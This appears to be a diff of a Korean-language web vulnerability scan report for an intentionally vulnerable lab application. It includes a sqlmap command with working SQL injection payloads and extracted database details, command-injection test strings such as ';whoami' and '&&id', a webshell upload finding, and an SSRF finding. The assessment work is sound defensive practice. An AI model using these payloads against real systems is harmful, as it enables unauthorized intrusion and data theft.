@@ -1,18 +1,18 @@
 {
-  "scan_id": "SCAN-20260517-185806",
+  "scan_id": "SCAN-20260517-231657",
   "target": "http://15.164.60.79",
   "scanner": "signature-based",
-  "generated_at": "2026-05-17T18:58:06+09:00",
+  "generated_at": "2026-05-17T23:16:57+09:00",
   "summary": {
     "total": 21,
     "severity": {
       "critical": 0,
-      "high": 2,
+      "high": 4,
       "medium": 8,
       "low": 2,
-      "pass": 0,
+      "pass": 4,
       "n/a": 3,
-      "pending": 6
+      "pending": 0
     }
   },
   "results": [
@@ -103,7 +103,7 @@
       "name": "쿠키 Secure/HttpOnly 미설정",
       "url": "/vulnapp/login.jsp",
       "severity": "medium",
-      "evidence": "Set-Cookie=JSESSIONID=106B03824FD72B4B8716ABD2868EB7C6; Path=/vulnapp; HttpOnly, missing=['secure', 'samesite']",
+      "evidence": "Set-Cookie=JSESSIONID=CB689639FD615B11C2C3EE1F1A8AAB44; Path=/vulnapp; HttpOnly, missing=['secure', 'samesite']",
       "recommendation": "세션 쿠키에 Secure, HttpOnly, SameSite 속성을 적용해야 한다."
     },
     {
@@ -121,7 +121,7 @@
         "sqlmap": {
           "command": "sqlmap -u http://15.164.60.79/vulnapp/login.jsp --batch --level 2 --risk 1 --banner --current-user --current-db --is-dba --dbs --data id=test&pw=test",
           "returncode": 0,
-          "raw_tail": "IONID=70441B7F513...2A29E33862'). Do you want to use those [Y/n] Y\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: id (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: id=test' AND 1942=(SELECT (CASE WHEN (1942=1942) THEN 1942 ELSE (SELECT 3481 UNION SELECT 6931) END))-- -&pw=test\n\n    Type: error-based\n    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)\n    Payload: id=test' AND EXTRACTVALUE(1276,CONCAT(0x5c,0x717a787671,(SELECT (ELT(1276=1276,1))),0x71786a7871)) AND 'eTUC'='eTUC&pw=test\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=test' AND (SELECT 4127 FROM (SELECT(SLEEP(5)))gDqM) AND 'OXDt'='OXDt&pw=test\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 4 columns\n    Payload: id=test' UNION ALL SELECT NULL,CONCAT(0x717a787671,0x4142514164594f4d79596151685377774e527562454b585269536c4c694e726f584d704c6f62524a,0x71786a7871),NULL,NULL-- -&pw=test\n---\n[18:58:05] [INFO] the back-end DBMS is MySQL\n[18:58:05] [INFO] fetching banner\nweb server operating system: Linux Ubuntu\nweb application technology: Django, Nginx 1.28.3, JSP\nback-end DBMS operating system: Linux Ubuntu\nback-end DBMS: MySQL >= 5.1 (MariaDB fork)\nbanner: '11.8.6-MariaDB-5 from Ubuntu'\n[18:58:05] [INFO] fetching current user\ncurrent user: 'vulnuser@localhost'\n[18:58:05] [INFO] fetching current database\ncurrent database: 'vuln_db'\n[18:58:05] [INFO] testing if current user is DBA\n[18:58:05] [INFO] fetching current user\n[18:58:05] [WARNING] potential permission problems detected ('command denied')\ncurrent user is DBA: False\n[18:58:05] [INFO] fetching database names\navailable databases [2]:\n[*] information_schema\n[*] vuln_db\n\n[18:58:05] [INFO] fetched data logged to text files under 'C:\\Users\\EZ\\AppData\\Local\\sqlmap\\output\\15.164.60.79'\n\n[*] ending @ 18:58:05 /2026-05-17/\n\n\n"
+          "raw_tail": "IONID=DE7769AED6A...5F88E4B32F'). Do you want to use those [Y/n] Y\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: id (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: id=test' AND 1942=(SELECT (CASE WHEN (1942=1942) THEN 1942 ELSE (SELECT 3481 UNION SELECT 6931) END))-- -&pw=test\n\n    Type: error-based\n    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)\n    Payload: id=test' AND EXTRACTVALUE(1276,CONCAT(0x5c,0x717a787671,(SELECT (ELT(1276=1276,1))),0x71786a7871)) AND 'eTUC'='eTUC&pw=test\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=test' AND (SELECT 4127 FROM (SELECT(SLEEP(5)))gDqM) AND 'OXDt'='OXDt&pw=test\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 4 columns\n    Payload: id=test' UNION ALL SELECT NULL,CONCAT(0x717a787671,0x4142514164594f4d79596151685377774e527562454b585269536c4c694e726f584d704c6f62524a,0x71786a7871),NULL,NULL-- -&pw=test\n---\n[23:16:55] [INFO] the back-end DBMS is MySQL\n[23:16:55] [INFO] fetching banner\nweb server operating system: Linux Ubuntu\nweb application technology: JSP, Nginx 1.28.3, Django\nback-end DBMS operating system: Linux Ubuntu\nback-end DBMS: MySQL >= 5.1 (MariaDB fork)\nbanner: '11.8.6-MariaDB-5 from Ubuntu'\n[23:16:55] [INFO] fetching current user\ncurrent user: 'vulnuser@localhost'\n[23:16:55] [INFO] fetching current database\ncurrent database: 'vuln_db'\n[23:16:55] [INFO] testing if current user is DBA\n[23:16:55] [INFO] fetching current user\n[23:16:55] [WARNING] potential permission problems detected ('command denied')\ncurrent user is DBA: False\n[23:16:55] [INFO] fetching database names\navailable databases [2]:\n[*] information_schema\n[*] vuln_db\n\n[23:16:55] [INFO] fetched data logged to text files under 'C:\\Users\\EZ\\AppData\\Local\\sqlmap\\output\\15.164.60.79'\n\n[*] ending @ 23:16:55 /2026-05-17/\n\n\n"
         }
       },
       "recommendation": "PreparedStatement와 바인딩 파라미터를 사용하고 입력값 검증 및 DB 오류 메시지 비노출 처리를 적용해야 한다."
@@ -141,20 +141,20 @@
       "check_id": "WEB-A05-003",
       "owasp": "A05:2025 Injection",
       "name": "Stored XSS",
-      "url": "/vulnapp/upload.jsp",
-      "severity": "pending",
-      "evidence": "게시글 목록에서는 저장형 XSS 페이로드 실행 흔적이 확인되지 않았으나, 저장된 게시글 상세 조회 검증이 필요함. 수동진단에서 게시글 상세 조회 404가 확인되어 최종 판단 보류.",
-      "recommendation": "게시글 상세 조회 페이지를 정상화하고 저장된 <script>alert(1)</script>가 실행되지 않고 HTML escaping되어 출력되는지 재진단해야 한다."
+      "url": "/vulnapp/board.jsp",
+      "severity": "pass",
+      "evidence": "/vulnapp/board.jsp에 저장한 테스트 게시글이 재조회되었고 script 페이로드가 HTML escape된 형태로만 확인되어 Stored XSS가 차단됨.",
+      "recommendation": "현재 출력 인코딩 정책을 유지하고 게시글 상세/목록의 모든 출력 지점에 동일한 escaping 정책을 적용해야 한다."
     },
     {
       "id": "RES-0013",
       "check_id": "WEB-A05-004",
       "owasp": "A05:2025 Injection",
       "name": "Command Injection",
-      "url": "/vulnapp/ping.jsp?host=",
-      "severity": "pending",
-      "evidence": "/vulnapp/ping.jsp?host=127.0.0.1 요청이 404로 확인되어 Command Injection 진단을 수행할 수 없음.",
-      "recommendation": "ping.jsp 기능을 구현하되 ;whoami, &&id, |whoami 같은 명령어 삽입 입력은 차단되도록 수정 후 재진단해야 한다."
+      "url": "/vulnapp/command.jsp",
+      "severity": "pass",
+      "evidence": "/vulnapp/command.jsp 명령어 삽입 페이로드에서 실행 결과 미노출. blocked=['time_snapshot;whoami', 'host_summary&&id', 'uptime_check|whoami']",
+      "recommendation": "작업 코드 입력값은 허용 문자만 통과시키고 OS 명령 문자열 직접 결합을 금지해야 한다."
     },
     {
       "id": "RES-0014",
@@ -192,9 +192,9 @@
       "owasp": "A07:2025 Authentication Failures",
       "name": "약한 비밀번호 허용",
       "url": "/vulnapp/register.jsp",
-      "severity": "pending",
-      "evidence": "/vulnapp/register.jsp 요청이 404로 확인되어 약한 비밀번호 허용 여부를 진단할 수 없음.",
-      "recommendation": "회원가입 또는 비밀번호 설정 기능을 구현하고 1234, password, admin123 같은 약한 비밀번호를 서버 측에서 거부하도록 수정 후 재진단해야 한다."
+      "severity": "pass",
+      "evidence": "대표 약한 비밀번호가 가입 성공으로 처리되지 않음. blocked=['1234', 'password', 'admin123']",
+      "recommendation": "서버 측 비밀번호 정책을 유지해야 한다."
     },
     {
       "id": "RES-0018",
@@ -212,9 +212,9 @@
       "owasp": "A08:2025 Software or Data Integrity Failures",
       "name": "웹쉘 업로드 가능",
       "url": "/vulnapp/upload.jsp",
-      "severity": "pending",
-      "evidence": "shell.jsp 업로드 시도 후 업로드 실행 여부가 확인되지 않음. upload_process.jsp 500, 저장 경로 404 등 업로드 처리 오류 또는 저장 경로 확인이 필요함.",
-      "recommendation": "WEB-A08-001은 취약 항목으로 설계했으므로 shell.jsp 업로드가 성공하고 /vulnapp/uploads/shell.jsp 접근 시 JSP_UPLOAD_TEST 문자열이 출력되도록 수정 후 재진단해야 한다."
+      "severity": "high",
+      "evidence": "http://15.164.60.79/vulnapp/uploads/shell.jsp 접근 시 테스트용 JSP 문자열 JSP_UPLOAD_TEST가 출력되어 업로드된 JSP 파일이 웹 경로에서 실행되는 것이 확인됨.",
+      "recommendation": "실행 가능한 .jsp/.jspx/.php 등 서버 사이드 스크립트 확장자 업로드를 차단하고, 업로드 파일은 웹 루트 외부에 저장하며 파일명을 난수화해야 한다."
     },
     {
       "id": "RES-0020",
@@ -222,9 +222,9 @@
       "owasp": "A10:2025 Mishandling of Exceptional Conditions",
       "name": "Stack Trace 노출",
       "url": "/vulnapp/profile.jsp?user_idx=abc",
-      "severity": "pending",
-      "evidence": "http://15.164.60.79/vulnapp/profile.jsp?user_idx=abc 응답에 내부 DB/예외 메시지가 노출되지만 Java/Tomcat stack trace 자체는 확인되지 않음. 원래 양호 항목으로 설계되어 사이트 수정 후 재진단 필요.",
-      "recommendation": "사용자에게는 일반 오류 메시지만 보여주고 상세 DB/예외 정보는 서버 로그에만 기록하도록 수정 후 재진단해야 한다."
+      "severity": "pass",
+      "evidence": "오류 유발 요청에서 Java/Tomcat stack trace 또는 내부 예외 정보가 확인되지 않음.",
+      "recommendation": "커스텀 에러 페이지와 예외 정보 비노출 정책을 유지해야 한다."
     },
     {
       "id": "RES-0021",
@@ -232,9 +232,9 @@
       "owasp": "A10:2025 Mishandling of Exceptional Conditions",
       "name": "SSRF",
       "url": "/vulnapp/fetch.jsp?url=",
-      "severity": "pending",
-      "evidence": "/vulnapp/fetch.jsp가 404로 확인되어 SSRF 진단을 수행할 수 없음. /vulnapp/internal/secret.jsp도 404라 내부 테스트 자원 확인이 필요함.",
-      "recommendation": "fetch.jsp?url= 기능과 /vulnapp/internal/secret.jsp 내부 테스트 페이지를 구현한 뒤 SSRF 취약 여부를 재진단해야 한다."
+      "severity": "high",
+      "evidence": "fetch.jsp가 내부 URL http://127.0.0.1:8080/을 요청하고 Tomcat 내부 페이지 내용을 반환",
+      "recommendation": "사용자 입력 URL 요청을 제한하고 localhost/사설 IP/메타데이터 주소 접근을 차단해야 한다."
     }
   ]
 }
